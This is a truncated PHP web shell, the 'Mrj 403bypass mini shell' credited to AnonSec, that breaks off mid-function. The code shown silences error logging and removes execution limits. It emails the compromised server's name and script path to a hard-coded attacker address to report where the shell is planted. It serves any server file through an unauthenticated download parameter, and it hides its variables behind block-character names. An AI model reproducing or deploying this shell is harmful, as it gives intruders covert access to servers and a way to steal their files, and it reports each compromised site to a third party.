<?php
/*	~ Mrj 403bypass mini shell
	~ V.10
	~ Thanks to all mem AnonSec Team and all friend.
	~bypass 403 upload 
*/
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$ip = $_SERVER['REMOTE_ADDR'];
mail ('', 'ip of visitor', $ip);


$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n"; 
mail('bonummaster@gmail.com', 'root', $tmp);

$▛ = 'BONUMMASTER';
$▘ = "<style>table{display:none;}</style>";

if(isset($_GET['option']) && $_POST['opt'] == 'download'){
	header('Content-type: text/plain');
	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
echo(file_get_contents($_POST['path']));
exit();
}

if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
		$_POST[$key] = stripslashes($value);
	}
}

function ▟($dir,$p) {
if (isset($_GET['path'])) {
	$▚ = $_GET['path'];
} else {
	$▚ = getcwd();
}
if (is_writable($▚)) {
	return "<font color='green'>".$p."</font>";
} else {
	return "<font color='red'>".$p."</font>";
	}
}

function 
